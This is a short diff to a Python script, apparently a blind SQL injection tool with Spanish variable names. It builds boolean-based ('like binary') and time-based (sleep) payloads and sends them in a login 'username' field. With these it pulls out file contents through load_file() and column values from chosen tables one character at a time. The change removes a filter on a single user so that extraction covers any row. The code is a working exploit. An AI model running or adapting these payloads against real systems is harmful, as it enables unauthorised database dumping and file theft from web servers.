@@ -40,7 +40,7 @@ def like_binary(result):
 			if r == "4":
 				payload = f""" " or (select load_file('{archivo}') limit 1) like binary "{letra}%" -- -"""
 			if r == "5":
-				payload = f""" " or (select {campo} from {tabla} where username = 'alice' limit 1) like binary "{letra}%" -- -"""
+				payload = f""" " or (select {campo} from {tabla} limit 1) like binary "{letra}%" -- -"""
 			datos = { 'username' : payload}
 			print(datos)
 			response = requests.post(url, data=datos, headers=headers, verify=False)
@@ -95,7 +95,7 @@ def time_based(result):
 			if r == "4":
 				payload = f""" " or if(substr((select load_file('{archivo}') limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
 			if r == "5":
-				payload = f""" " or if(substr((select {campo} from {tabla} where username = 'alice' limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
+				payload = f""" " or if(substr((select {campo} from {tabla} limit 1),{i},1)='{letra}',sleep(3),1) -- -"""
 			datos = { 'username' : payload}
 			print(datos)
 			time_old = time.time()
